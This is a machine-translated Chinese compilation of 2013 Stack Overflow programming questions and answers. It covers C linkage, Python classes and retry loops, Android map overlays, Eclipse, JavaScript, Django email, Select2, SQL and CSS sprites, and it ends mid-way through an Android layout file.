我知道如果找不到该函数的原型，将生成编译器错误。但是假设我知道一个库包含一些非公共函数，并且我为它创建了自己的原型（与静态库中的那个匹配），链接器能否将其拉入？

我问的原因是我正在创建一个库，我在其中使用函数的通用通用名称，例如“init()”，这些名称仅供内部使用。我想知道在链接过程中它们是否会与库外的符号发生冲突

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-05T19:29:59.543

它取决于函数的链接：

```
//.c file

// external linkage, accessible from outside using the right prototype
void foo(void) {}

// internal linkage, not accessible from outside
static void bar(void) {} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T20:11:54.947

解决您的问题的方法是为您的库定义一些前缀，例如`ouah_`，并为所有函数/变量名称提供前缀，除非您可以制作它们`static`（即，仅在定义它们的文件中可见）。不，它不能*确保*没有名称冲突，但它应该会减少很多。就像Doug Gwin [Q8](http://www.lysator.liu.se/c/q8/index.html)背后的原因一样......

这个 BTW 是`namespace`C++ 中存在的原因，也部分归咎于 OOP 及其属于“类”的“方法”/“成员函数”

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T19:51:23.697

原型是为了编译器的利益，而不是链接器。编译器会很高兴地为您声明的任何函数编译代码，但是如果您尝试使用在另一个文件或库中定义为静态的函数，则会出现链接器错误。

您可以并且应该将您自己的函数声明为静态函数，如果它们不在文件之外使用的话。但是，如果您随后使用包含具有相同函数名称的声明的其他代码进行编译，则会出现冲突，除非它们的定义都相同。例如，如果您将`init`函数定义为静态，则它只能在该文件中直接使用；但是，如果您包含任何以不同方式声明另一个函数的头文件 name `init`，您会收到错误消息。

（可以访问另一个文件中的静态函数，但它需要指针。）

# python - Python类继承新类型类

> ID：15232446
> 
> 赞同：3
> 
> 时间：2013-03-05T19:28:01.933
> 
> 标签：python

我试图理解 Python 中的类继承并创建了以下继承，

问题：当我继承B类并调用方法A时，它会打印“Im方法B”..它不会调用A类的方法A吗？

```
class A(object):
    def methodA(self):
        print 'Im method A'

class B(A):
    def methodA(self):
        print 'Im method B'    

class C(A):
    def methodA(self):
        print 'Im method C'    

class D(B,C):
    def methodA(self):
        print 'Im method D'            
def main():
    x = D()
    x.methodA() 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-05T19:29:24.193

不，如果要调用要覆盖的方法，则必须手动执行[`super`](http://docs.python.org/2/library/functions.html#super)：

```
class B(A):
    def methodA(self):
        super(B, self).methodA()
        print 'Im method B' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T19:37:05.500

不，Python 方法默认是隐式[虚拟的。](http://en.wikipedia.org/wiki/Virtual_function)这意味着它们将始终被相应的子类方法覆盖。

# android - 关于使用 GroundOverlay 或 TileOverlay 在 GoogleMap 中显示大型叠加图像的一些问题

> ID：15232460
> 
> 赞同：1
> 
> 时间：2013-03-05T19:28:25.777
> 
> 标签：android, google-maps-android-api-2

我有一个应用程序，用户可以在其中加载谷歌地图上的图像。这是为 2.3 开发的，所以有一个 MapActivity、一个 MapView 和我的自定义 Overlay 类来显示图像。在覆盖类绘制方法中，我每次都重新计算一个矩阵，因此图像得到正确的大小和位置。我还有一个校准模式，用户可以通过拖动参考点来调整图像。

我将向应用程序添加一些功能，并且我想从一些更新开始，例如使用片段。用 MapFragment 替换 MapActivity 会带来一些问题，因为似乎不支持您可以自己实现绘图的叠加层。看来我将不得不使用 GroundOverlays 或 TileOverlay。（如果我错了，请纠正我。）

这些似乎都不支持在添加叠加层后对其进行任何修改，因此图像的校准将不起作用。我对这部分的计划是在 MapFragment 顶部放置一个普通的 ImageView 用于校准模式。（这将隐藏所有标记，但这在校准期间并不重要。）为此，我需要两件事： * 接收影响校准点的所有触摸事件并转发其余的以允许正常缩放等 * 随时检测位置/旋转/缩放级别发生变化，因此我可以调整图像。问题#1：我可以期待任何重大问题吗？

然后我必须决定是否首选 GroundOverlays 或 TileOverlay。

GroundOverlay：这似乎需要最少的工作，因为它仍然会加载整个图像。我还认为它会自动处理屏幕方向变化等事情。问题 #2：GroundOverlay 能否很好地处理大图像（最大 2000*2000 像素）？是否有任何涉及图像的复制？由于图像太大，我无法在内存中复制一份以上。

TileOverlay：从某种意义上说，这似乎是一个更专业的解决方案，因为它只使用实际需要的部分，并且我稍后可以介绍对同时使用多个地图图像源的支持。我可能必须提前生成图块并为每个图块保存一个单独的文件，将其保存在内存中并按需创建图块可能会占用大量内存。（或者也许我可以创建一个单独的 tile 服务，但这似乎有点脏。） 问题 #3：是否可以控制 tile 缓存将使用多少内存？是否适用通常的限制？我不想仅仅因为缓存占用了我允许使用的大部分内存而在应用程序的其他地方耗尽内存。问题 #4：文档说“请注意，与其他叠加层不同，如果重新创建地图，因此这意味着必须再次读取文件，从而导致明显的加载延迟。有什么好办法解决这个问题吗？问题5：当getTile被调用，我返回null（因为tile保存在一个文件中，我不想在读取的时候阻塞ui线程），需要多长时间才能再次请求它？（似乎没有办法手动加载单个图块。） 问题 6：如何确定一个图块图像的良好图像分辨率（关于性能和质量）？因此这意味着必须再次读取文件，从而导致明显的加载延迟。有什么好办法解决这个问题吗？问题5：当getTile被调用，我返回null（因为tile保存在一个文件中，我不想在读取的时候阻塞ui线程），需要多长时间才能再次请求它？（似乎没有办法手动加载单个图块。） 问题 6：如何确定一个图块图像的良好图像分辨率（关于性能和质量）？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-06T20:38:50.597

很多问题。我会尝试解决一些问题。

1.  通常，请注意 Maps API v2 比 v1 宽松得多。这是一件好事。v2 有许多 v1 没有的内置函数和优化，并且通过限制性 API 迫使您使用它的优化。

2.  例如，如果您使用 GroundOverlay 显示图像[假设您不需要旋转或扭曲它]，您只需指定它的纬度/经度边界，Maps v2 将为您拉伸图像。2000x2000 将是 2000x2000x4 字节，因此内存中有 16MBytes。但是 GroundOverlayOptions 使用 BitmapDescriptor，所以它可能永远不会将图像完全加载到内存中。我对 GroundOverlay 不是很熟悉。

    另一种选择是在第一次加载图像时将图像切割成平铺并将它们保存在本地存储中，然后与 TileOverlay 一起使用非常简单。您不能直接从 2kx2k 图像中合理地读取图块，因为它会涉及到全部读取（如果压缩，我猜是这样）。如果您需要显示图像的修改版本，请记住，在确保它是可变的之后，您只需要在位图上创建一个画布。

3.  我更熟悉我经常使用的 TileOverlay。切片缓存对我来说看起来很公平，我已经加载了大量的 256x256 切片并且总是保持在 13M 和 20M 之间的堆。我认为它使用与谷歌地图图块相同的方法，在本地存储内存中缓存一些但不会太多，并且根本不缓存未显示的内存图块。您可以在填充时看到正在重新加载图块。

    您可以通过列出内部存储的文件轻松查看 GMaps 切片缓存策略。在那里你会看到 GMaps 缓存切片。

4.  是的，当停止/启动时，GoogleMap 将为每个显示的图块调用 getTile(x, y, zoom)。看起来每个对 getTile 的调用都有自己的线程，所以加载时间不是问题。如果您的图块已经存储在您的设备上，则加载速度非常快。只要您以智能的方式存储数据，这真的不是问题。

5.  我从来没有返回null。不知道在这种情况下会发生什么。也许它会触发一个被忽略的异常。请注意，GoogleMap 调用将忽略您的代码在 getTile 中生成的任何运行时异常甚至某些 java.lang.error [... //code.google.com/p/gmap...](https://code.google.com/p/gmaps-api-issues/issues/detail?id=4995)

    为了回答您的问题，我返回了“NO_TILE”对象，然后 GMap 像任何图块一样缓存它。您可以通过调用[TileOverlay.clearTileCache()](http://developer.android.com/reference/com/google/android/gms/maps/model/TileOverlay.html#clearTileCache%28%29)强制重新加载图块。

6.  我一直在考虑这一点，但我只使用 256x256 磁贴，即使在高 DPI Nexus 10 上也足够好。我没有对这个问题进行更多调查，但可能是 GMaps 已经选择了最好的磁贴显示取决于缩放级别，前提是 256p 是相当标准的平铺尺寸。

# android - Eclipse 链接文件夹错误“与预期的包不匹配”

> ID：15232461
> 
> 赞同：1
> 
> 时间：2013-03-05T19:28:26.970
> 
> 标签：android, eclipse

这是 ADT v21.0.1-543035

我的 Eclipse 工作区中有 Project1。我添加了 Project2 并试图创建一个指向 Project1 中的 util 文件夹的链接文件夹。我添加了链接文件夹，如下所示：

*   在 Eclipse Project2 中，右键单击 src 并选择 New... Folder。
*   单击高级，选择链接文件夹。
*   单击变量，选择 WORKSPACE_LOC，单击扩展，浏览到要链接的文件夹，例如 Project1/src/com/mycompany/demo/util/
*   单击确定。
*   返回“新建文件夹”对话框，将文件夹名称编辑为完整路径，例如 com.mycompany.demo.util
*   单击完成。

Eclipse 添加链接文件夹，但在控制台中显示以下错误：

```
The declared package "com.mycompany.demo.util" does not match the expected package "com.mycompany.demo.util" 
```

当我查看链接文件夹的属性时，它显示的路径为：

```
/Project1/src/com.mycompany.demo.util 
```

而不同项目中的相同链接文件夹如下所示：

```
/Project1/src/com/mycompany/demo/util 
```

我错过了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T20:04:34.277

这不是我的问题“为什么”创建链接文件夹不起作用的答案，但这是我修复它的方法。

我退出 Eclipse 并查看 Project2 的*.project*文件，我看到它有以下内容：

```
<linkedResources>
  <link>
    <name>src/com.mycompany.demo.util</name>
    <type>2</type>
    <locationURI>WORKSPACE_LOC/Project1/src/com/mycompany/demo/util</locationURI>
  </link>
</linkedResources> 
```

我查看了链接文件夹正在工作的另一个项目的*名称令牌，它具有以下值：*

```
 <name>src/com/mycompany/demo/util</name> 
```

所以我编辑了 Project2 的*名称*以包含斜杠，重新启动 Eclipse 并清理了 Project2。

Project2 现在在 src 文件夹中显示了两个条目：

*   名为 com.mycompany.demo.util 的链接文件夹，带有警告指示器图标
*   具有相同名称的常规文件夹，还带有警告指示器图标

我删除了常规文件夹条目并检查了链接文件夹的属性。路径看起来不错，但位置没有设置。我单击了编辑，使用原始问题中描述的 WORKSPACE_LOC 变量设置值，瞧！Eclipse 现在可以正确解析链接的文件夹。

# javascript - 无法读取 Null 的属性值 - Javascript

> ID：15232464
> 
> 赞同：1
> 
> 时间：2013-03-05T19:28:38.443
> 
> 标签：javascript, dynamic

大家下午好 - 我有一个（可能）简单的问题，经过相当彻底的搜索后，我似乎无法找到答案。我在 chrome 中遇到的错误是“Uncaught TypeError: Cannot read property 'value' of null”。在第 120 行（复制如下）：

```
mercedes_txt = mercedes_txt + "<tr><td><button id=\"Mercedes Add Value\"
    onclick=\"addAttribute('Merceds-Benz', " + mercedes_counter + ", '" +
    document.getElementById('Mercedes-Benz Text').value + "')\">Add</button></td><td>
    <input type=\"text\" name=\"Mercedes-Benz Text\" id=\"Mercedes-Benz Text\" />
    </td></tr></table>"; 
```

为了便于阅读，我尝试将代码分成多行。如果我取出“onclick”，代码将正确执行。另外，如果我更换

```
'" + document.getElementById ('Mercedes-Benz Text').value + "' 
```

使用“someValue”，代码可以正确执行。所以问题一定是我从一个动态创建的对象中请求值（它还不存在，但一旦代码应用到 innerHTML 调用中就会存在）。对不起，我是新手，但我感谢大家的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:33:01.380

我看到两个错误：

1.  尝试为您的元素使用无效的 id。请参阅[HTML 中 id 属性的有效值是什么？](https://stackoverflow.com/questions/70579/what-are-valid-values-for-the-id-attribute-in-html)对于 id 命名规则。

2.  您正在尝试获取尚未添加到 DOM 的元素的值。

我建议摆脱那个内联`onclick`处理程序，并通过代码添加。像这样的东西：

```
var addValueButton = document.getElementById('MercedesAddValue');
addValueButton.addEventListener('click', function(e) {
   // get live form values here by traversing the DOM
   // you may want to use jQuery...
}); 
```

# python - 如何重复 try-except 块

> ID：15232465
> 
> 赞同：17
> 
> 时间：2013-03-05T19:28:45.660
> 
> 标签：python, exception-handling, python-3.x

我在 Python 3.3 中有一个 try-except 块，我希望它无限期地运行。

```
try:
    imp = int(input("Importance:\n\t1: High\n\t2: Normal\n\t3: Low"))
except ValueError:
    imp = int(input("Please enter a number between 1 and 3:\n> ") 
```

目前，如果用户输入一个非整数，它会按计划工作，但是如果他们再次输入它，它只会再次引发 ValueError 并崩溃。

解决此问题的最佳方法是什么？

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2013-03-05T19:30:12.520

把它放在一个 while 循环中，当你得到你期望的输入时就中断。最好保持所有代码都依赖于`imp`下面的代码`try`，或者为它设置一个默认值以防止`NameError`' 进一步下降。

```
while True:
  try:
    imp = int(input("Importance:\n\t1: High\n\t2: Normal\n\t3: Low"))

    # ... Do stuff dependant on "imp"

    break # Only triggered if input is valid...
  except ValueError:
    print("Error: Invalid number") 
```

**编辑**：user2678074 指出这可能会使调试变得困难，因为它可能会陷入无限循环。

我会提出两个建议来解决这个问题 - 首先使用具有定义重试次数的 for 循环。其次，将上述内容放在一个函数中，使其与应用程序逻辑的其余部分分开，并将错误隔离在该函数的范围内：

```
def safeIntegerInput( num_retries = 3 ):
    for attempt_no in range(num_retries):
        try:
            return int(input("Importance:\n\t1: High\n\t2: Normal\n\t3: Low"))
        except ValueError as error:
            if attempt_no < (num_retries - 1):
                print("Error: Invalid number")
            else:
                raise error 
```

有了这个，你可以在函数调用之外有一个 try/except ，只有当你超过最大重试次数时它才会通过。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-03-05T19:37:20.967

```
prompt = "Importance:\n\t1: High\n\t2: Normal\n\t3: Low\n> "
while True:
    try:
        imp = int(input(prompt))
        if imp < 1 or imp > 3:
            raise ValueError
        break
    except ValueError:
        prompt = "Please enter a number between 1 and 3:\n> " 
```

输出：

```
rob@rivertam:~$ python3 test.py 
Importance:
    1: High
    2: Normal
    3: Low
> 67
Please enter a number between 1 and 3:
> test
Please enter a number between 1 and 3:
> 1
rob@rivertam:~$ 
```

# django - djangoappengine 电子邮件未到达

> ID：15232470
> 
> 赞同：0
> 
> 时间：2013-03-05T19:29:01.477
> 
> 标签：django, google-app-engine, email

我正在使用 djangoappengine 为 Google App 引擎构建一个 Django 应用程序，我尝试了几种配置来发送电子邮件但没有工作，目前我有以下 setting.py

```
enter code here

EMAIL_HOST = 'smtp.gmail.com'
EMAIL_PORT = 587
EMAIL_HOST_USER = 'myemail@gmail.com'
EMAIL_HOST_PASSWORD = 'mypassword'
EMAIL_USE_TLS = True 
```

默认 email_backend 和 views.py

```
enter code here
def contato(request):
    email = EmailMessage('Assunto teste', 'Aqui vai o corpo do email',from_email='myemail@gmail.com', to=['toemail@gmail.com'])
    email.send(fail_silently = True)
    return render(request, 'paginas/contato.html') 
```

在 App Engine 管理员上，每次我请求“contato”时，通过电子邮件发送的收件人配额都会不断计数，我假设电子邮件已发送，但我从未收到电子邮件。有人可以指出我应该如何配置我的应用以在 Google app Engine 上发送电子邮件的正确方向吗？我错过了什么？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T13:51:37.397

```
fromHeader = "...."
email = EmailMessage(
    subject, message, 'myemail@gmail.com',
    ['toemail@gmail.com',],
    headers={'Reply-To': 'myemail@gmail.com', 'From': fromHeader})
email.send() 
```

# python - python：使用赋值创建可以由自己编写的只读属性

> ID：15232471
> 
> 赞同：1
> 
> 时间：2013-03-05T19:29:10.037
> 
> 标签：python, properties

我试图通过不提供设置器来创建只读属性。但似乎在同一个类中我也无法写入该属性。

这是只读属性应该如何工作的吗？我确实需要在其类中对其进行修改，但不希望它由其他类编写。这就是为什么我更喜欢能够：

```
class MyClass(object)
    def __init__(self):
        self.myAttrib = None

    def getx(self):
        return self.myAttrib

    myAttrib = property(getx, "I'm the read-only property.")

    def MyMethod(self):
        self.myAttrib = myValue 
```

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-05T19:32:48.260

是的，这就是它应该如何工作的方式。只读意味着只读，而不是“某些类可读而其他类可写”。

可能有可能使它只能由它的类写，但你应该考虑你为什么想要这个。一般来说，Python 并不适合这种设计。您应该只记录该属性是私有的，并且可能给它一个以下划线开头的名称（一个下划线，而不是两个）。这清楚地表明，如果其他人编写了与它混淆的代码，那么他们就是他们自己，然后如果他们这样做并且出现问题，那是他们自己的错。强制执行类私有访问几乎没有真正的好处。

但是请注意，您的代码无论如何都有一些错误，因为您没有`property`正确使用。您为该属性提供了与其正在访问的基础属性相同的名称。如果您的属性被调用`myAttrib`，它的 getter/setter 应该获取/设置具有*不同*名称的属性。属性的名称是属性本身的名称，而不是存储它获取/设置的值的隐藏属性。所以更像：

```
def __init__(self):
    self._myAttrib = "I'm the read-only property."

def getx(self):
    return self._myAttrib

myAttrib = property(getx) 
```

Now`myAttrib`是一个提供对底层属性的读取访问的属性`_myAttrib`。这就是属性在 Python 中的工作方式。另请注意，您没有将值传递`"I'm the read-only property."`给`property`，而是直接在基础属性上设置它。

如果你愿意，你可以做一个这样的属性，然后`_myAttrib`直接在你的类的代码中设置。这就像您似乎想要的那样：它可以让您设置值，但是使用该属性（而不是“秘密” `_myAttrib`）的其他代码将无法设置它。

但是，这也是您应该重新考虑的事情。像这样定义一个微不足道的 getter 并没有真正意义。直接命名属性`_myAttrib`并直接读取其值并记录该值不应更改更简单。属性的重点不是提供关于谁应该和不应该访问属性的协议的强制执行；关键是在获取/设置值时允许对值进行编程计算或操作（例如，设置属性也会更新对象上的其他链接属性）。

# jquery-select2 - Select2 Ajax 不根据查询过滤结果

> ID：15232476
> 
> 赞同：11
> 
> 时间：2013-03-05T19:29:48.823
> 
> 标签：jquery-select2

我是 Select2 的新手，在集成 AJAX 时遇到了麻烦。当我搜索时，没有根据查询过滤结果。

下面是它的外观： http: [//i.imgur.com/dAPSSDH.png](https://i.imgur.com/dAPSSDH.png) - 结果中正确的字符带有下划线，但没有过滤掉任何内容。在我的非 ajax Select2 和我看到的示例中，过滤似乎是自动发生的，所以我很犹豫是否要编写自定义过滤器，因为可能已经内置了更好的过滤器。

这是我的代码：

```
<script>
  $("#search_bar").select2({
    placeholder: "Search for another Concept",
    minimumInputLength: 1,
    ajax: { // instead of writing the function to execute the request we use Select2's convenient helper
      url: "/concepts/names_for_search",
      dataType: 'json',
      data: function (term, page) {
        return {
        q: term, // search term
        page: page
         };
      },
      results: function (data, page) {
        return { results: data};
      }
    },
  });
</script> 
```

另外，这是我的 JSON 示例：

```
[{"id":1,"text":"Limits"},{"id":2,"text":"Derivatives"},{"id":3,"text":"One-Sided Limits"},{"id":4,"text":"Formal Definition of a limit"}] 
```

有任何想法吗？希望我只是在做一些愚蠢的事情，这是一个快速修复。提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-22T19:55:38.560

您需要在服务器端编写一个自定义过滤器来过滤结果。您在框中输入的内容保存在“term”中，然后“q”作为请求参数与 ajax 调用一起发送。所以对
url:"/concepts/names_for_search?q=deri"的 ajax 调用
应该只返回过滤后的结果，而不是所有的结果。

 **每次您在搜索框中键入内容时，**Update Select2 都会进行 AJAX 调用。**您必须在服务器端过滤结果，然后根据搜索框中的文本返回结果。
我在我的 JSP/Servlet 应用程序中使用它，如下所示**

 **```
protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException  
{
    String searchTerm = request.getParameter("q");

    String json = getOptions(searchTerm);
    //getOptions method will return a string of  in JSON format
    //[{"id":"1","name":"Derivatives"}]
    response.getWriter().write(json);
} 
```

您的 JavaScript 代码是正确的。

I found Select2 is used [here](http://www.indiewebseries.com). If you open the link [http://www.indiewebseries.com/search?q=ind](http://www.indiewebseries.com/search?q=ind) and [http://www.indiewebseries.com/search?q=in](http://www.indiewebseries.com/search?q=in) the results obtained are different and based on the 'q' parameter.
While in you case, the results for calls to url '/concepts/names_for_search?q=d' and '/concepts/names_for_search?q=deri' are the same(i.e. not filtered)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-01-30T18:01:04.067

This question was asked on the github project and the answer was: filter on the server side. The default filter function called when AJAX is not used is present in the Select2 documentation on the `matcher` parameter:

```
function(term, text) { return text.toUpperCase().indexOf(term.toUpperCase())>=0; } 
```**

# javascript - 你能得到一个元素在屏幕上（不是在视口中）的绝对位置吗？

> ID：15232478
> 
> 赞同：4
> 
> 时间：2013-03-05T19:29:54.503
> 
> 标签：javascript, html, css

我想将一个元素放在屏幕上的绝对位置上，以便它保持在（大致）相同的位置，即使*浏览器窗口*移动（不滚动）也是如此。这样的事情甚至可能[吗？](http://i40.photobucket.com/albums/e202/bionicjoe/Animated%20GIFs/yesitis2.gif)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-05T20:13:57.490

也许不是最优化的解决方案，但您可以使用间隔来检查`window.screenX`and `window.screenY`（如评论中所建议）。然后，当这些值发生变化时，使用与上一个位置的差异来更新位置。就像是：

```
function setPosition(el, x, y) {
    var style = window.getComputedStyle(el);
    el.style.left = parseInt(style.left) + x + "px";
    el.style.top = parseInt(style.top) + y + "px";
}

var sX = window.screenX,
    sY = window.screenY,
    box = document.getElementById("box");

var interval = setInterval(function() {
    if (window.screenX !== sX || window.screenY !== sY) {
        setPosition(box, sX - window.screenX, sY - window.screenY);
        sX = window.screenX;
        sY = window.screenY;
    }
}, 1000/30); 
```

这是[JSFiddle](http://jsfiddle.net/HPkwK/)的示例。在 Chrome 上有点不稳定。

# apache - 对于像 /index.cfm/event/main.home 这样的 SES url，什么会导致带有 Railo 4 和 mod_cfml 的 tomcat 404？

> ID：15232487
> 
> 赞同：1
> 
> 时间：2013-03-05T19:30:38.620
> 
> 标签：apache, tomcat, railo, cfml

我越来越：

```
HTTP Status 404 - /admin/index.cfm/event/main.welcome

type Status report

message /admin/index.cfm/event/main.welcome

description The requested resource is not available.
Apache Tomcat/7.0.37 
```

但是当我去时它工作正常：

```
/admin/index.cfm?event=main.welcome 
```

或者

```
/admin/event/main.welcome (thanks to htaccess) 
```

但由于这是使用 MOD_CFML，我无法使用 HTACCESS 覆盖其中包含 .cfm 的 url。

我在网上的任何地方都找不到这个... :-/

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T15:10:43.783

您需要将此添加到*“基本 SES 映射”*`web.xml`下：

 *```
<url-pattern>/admin/index.cfm/*</url-pattern> 
```

据我所知，没有办法将其设置为处理动态子文件夹，您必须为每个拥有此类页面的子文件夹添加其中一个。*

# sql - 通过sql对表数进行排序

> ID：15232490
> 
> 赞同：-2
> 
> 时间：2013-03-05T19:30:49.730
> 
> 标签：sql, sql-server, sql-server-2008

我在 sql server 中有一个表，其中包含以下字段

```
firstname,id,affID 
```

affID 是其他用户的 id。

可以说我有这个记录

```
firstname     id    affID
bob            1     2        
someone        2     3
bob2           3     2 
baaroz         4     3
lastman        5     2 
```

我想做一个查询，向我显示名字、id 和其他用户中此 id 的 affID 计数按此计数排序。

所以最后的输出应该是这样的

```
firstname  id     count(number of this id in affID of other users)
someone    2            3
bob2       3            2
bob        1            0
baaroz     4            0
lastman    5            0 
```

到目前为止，我做了这个查询，返回每个 id 的 affID 数

```
SELECT affID, count(affID) FROM Users group by affID 
```

上面提到的输出的正确查询是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:37:25.973

您应该能够使用子查询来获取计数，然后加入您的表：

```
select u1.firstname,
  u1.id,
  coalesce(u2.total, 0) total
from users u1
left join
(
  SELECT affID, count(affID) Total
  FROM Users 
  group by affID 
) u2
  on u1.id = u2.affID
order by u2.total desc; 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/016ca/8)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:34:46.460

您将需要进行自联接以获取每个用户的计数，并使用左外联接将它们映射回所有用户。

此查询为影响其他用户的每个用户提供受影响用户的计数：

```
SELECT U.id                           -- This is the ID of the user that affected others
     , Count(U2.id) as Cnt            -- This is the Count 
  FROM Users U
  INNER JOIN User U2 
          ON U.AffUserId = U2.id
 GROUP BY U.id 
```

然后您需要进行最后的 LEFT OUTER JOIN，然后将此聚合数据映射到表中的**所有**用户（即，即使是那些没有影响任何人的用户）

```
SELECT Usr.firstName
     , Usr.id
     , ISNULL(Ctbls.Cnt, 0) as [Count]
  FROM Users Usr
LEFT OUTER JOIN
   (SELECT U.id, Count(U2.id) as Cnt
      FROM Users U
      INNER JOIN User U2 
              ON U.AffUserId = U2.id
      GROUP BY U.id) CTbls
    ON Usr.id = Ctbls.Id 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T19:37:37.217

我认为您对 baaroz 和 lastman 的 ID 值不应为“1”，而应分别为“4”和“5”。如果这是真的，那么我相信我理解你的问题，你需要做的就是添加

```
"ORDER BY Count(AffUserId) DESC" 
```

到您的查询结束。

（由于 Id 和用户名似乎是唯一的，您可以将用户名添加到您的组中。这是多余的，但比使用子查询并将表连接回自身更容易。）

# css - 用于 2 个不同类的单个 CSS 精灵。这是一个好方法吗？

> ID：15232491
> 
> 赞同：-1
> 
> 时间：2013-03-05T19:30:52.980
> 
> 标签：css, image, css-sprites

我试图通过在我的项目中使用精灵图像来减少 HTTP 调用的数量。所以结构是这样的：

```
<div class="parent">
  <div class="child-1">Content here</div>
  <div class="child-2">Content here</div>
</div>

<div class="outsider">
Content here
</div> 
```

我有一个具有 3 个图像的精灵——每个用于 2 个父类的子类，最后一个用于“局外人”类。

我可以尝试像这样给出 CSS：

```
.parent{
  background-image: url("../img/4-in-one-sprite.png");
}
.child-1{
  background-position: 0px -10px;
  width: 10px;
}
.child-2{
  background-position: 0px -20px;
  width: 10px;
}
.outsider{
  background-position: 0px -30px;
  width: 10px;
} 
```

既然外人不属于父母，就不会得到那个背景吧？因此，我还必须在其类定义中重新指定相同的背景图像，如下所示：

```
.outsider{
  background-image: url("../img/4-in-one-sprite.png");
  background-position: 0px -30px;
  width: 10px;
} 
```

我的疑问是：

1.  浏览器不会为局外人类发出额外的图像请求吗？想象一下图像没有被缓存并且它是该页面的第一次加载。

2.  或者浏览器会以某种方式智能地理解其相同的资源并且总共只进行 1 次调用？

3.  当我们提供背景图片时，在渲染页面的哪个阶段，浏览器会请求资源？是在解析 css 时还是在将它们绘制到 dom 上时？

4.  在不单独放置第三张图片的情况下，在这里使用 sprite 并将 http 调用减少到最低限度的最佳方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:44:25.443

`background-position`仅适用于`background-image`元素，这不是继承的东西（您不必添加`background: none`每个子元素以停止级联并一遍又一遍地与父、子、孙子元素具有相同的背景，不是吗？ ）。

因此，您在`background-image`这里出现了 3 次，一次为局外人，一次为 child-1，每个 child-2 一次（后者有错字）。以及 3 对不同的位置值。

浏览器只会请求每个唯一资源一次，不用担心，但 CSS、JS、图像、延迟、异步等资源加载的顺序可能会有所不同。Err 实际上确实有所不同。

使用精灵的最好方法是知道什么时候不使用它们：**当你应该使用带有属性的 HTML 图像时不要使用`alt`它们**。

最后，你缺少一个重要的属性：`background-repeat`. 没有重复的精灵（你会一次看到所有的精灵）。的 3个不同的 sprite`no-repeat`和一个是必需的。`repeat-y``repeat-x`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:39:23.950

一个非常好的方法是仅在这些元素上使用名称“sprite”。

然后在css中使用这样的东西：

```
[class^="sprite-"], [class*=" sprite-"] {
    background:transparent url("../img/4-in-one-sprite.png") no-repeat;
} 
```

因此，“.sprite-outside”和“.sprite-child-1”都将精灵作为背景，只需要在它们上面定位。

在 ie6 中不起作用，但现在如何关心？;)

而且，是的，浏览器很聪明！

# android - Android ListView 问题

> ID：15232492
> 
> 赞同：0
> 
> 时间：2013-03-05T19:31:02.277
> 
> 标签：android, listview

我有一个问题，即某些设备无法选择 listview 项目，而且我似乎无法找出代码中的问题 - 选择 listview 项目在我的设备和模拟器上都可以正常工作。我已经检查了焦点，但这似乎不是问题。有人有想法么？

公共类 GroupListFragment 扩展 ListFragment

```
 @Override
  public void onListItemClick(ListView listView, View view, int position, long id) {
    super.onListItemClick(listView, view, position, id);

    Group group = (Group) listView.getItemAtPosition(position);
    mCallbacks.onItemSelected(group);
  } 
```

公共类 GroupListActivity 扩展 FragmentActivity 实现 GroupListFragment.Callbacks

```
 @Override
  public void onItemSelected(Group group) {

      if (twoPaneLayout) {
        // seems to work fine
        Bundle arguments = new Bundle();
        arguments.putLong(GroupDetailFragment.GROUP_ITEM_ID, group.getId());

        GroupDetailFragment fragment = new GroupDetailFragment();
        fragment.setArguments(arguments);
        replaceDetailPane(fragment);
      } else {
        // does not work on some mobile devices
        Intent detailIntent = new Intent(this, GroupDetailActivity.class);
        detailIntent.putExtra(GroupDetailFragment.GROUP_ITEM_ID, group.getId());

        startActivity(detailIntent);
        overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_left);
      }

  } 
```

列表显示：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:animateLayoutChanges="true"
    android:background="@drawable/list_item_group_background" >

    <ListView
        android:id="@id/android:list"
        android:layout_width="0dp"
        android:layout_height="match_parent"
        android:layout_weight="1"
        android:divider="@null"
        android:dividerHeight="0dp"
        android:verticalScrollbarPosition="left" />

    <TextView
        android:id="@id/android:empty"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:gravity="center"
        android:textIsSelectable="false" />

</LinearLayout> 
```

定制项目：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:focusable="false"
    android:focusableInTouchMode="false"
    android:gravity="center_vertical"
    android:orientation="vertical" >

    <LinearLayout
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:background="@drawable/list_item_group_item_background"
        android:focusable="false"
        android:focusableInTouchMode="false"
        android:gravity="center_vertical"
        android:orientation="horizontal"
        android:paddingBottom="10dp"
        android:paddingLeft="15dp"
        android:paddingRight="15dp"
        android:paddingTop="10dp"
